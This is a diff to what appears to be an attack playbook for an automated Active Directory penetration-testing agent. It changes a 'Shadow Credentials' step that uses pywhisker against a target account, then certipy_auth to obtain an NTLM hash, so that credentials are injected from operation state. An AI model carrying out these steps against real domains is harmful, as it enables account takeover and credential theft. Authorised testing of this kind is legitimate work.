@@ -41,7 +41,8 @@ When you have these permissions on a user/computer:
 
 1. **Shadow Credentials** (BEST - one step to hash)
    ```
-   pywhisker(target_samaccountname="targetuser", domain="contoso.local", username="user", password="pass", dc_ip="192.168.58.10")
+   pywhisker(target_samaccountname="targetuser", domain="contoso.local", username="user", dc_ip="192.168.58.10")
+   → Worker injects credential for `user@contoso.local` from operation state
    → Use generated PFX with certipy_auth (from PrivEsc) to get NTLM hash
    ```
 
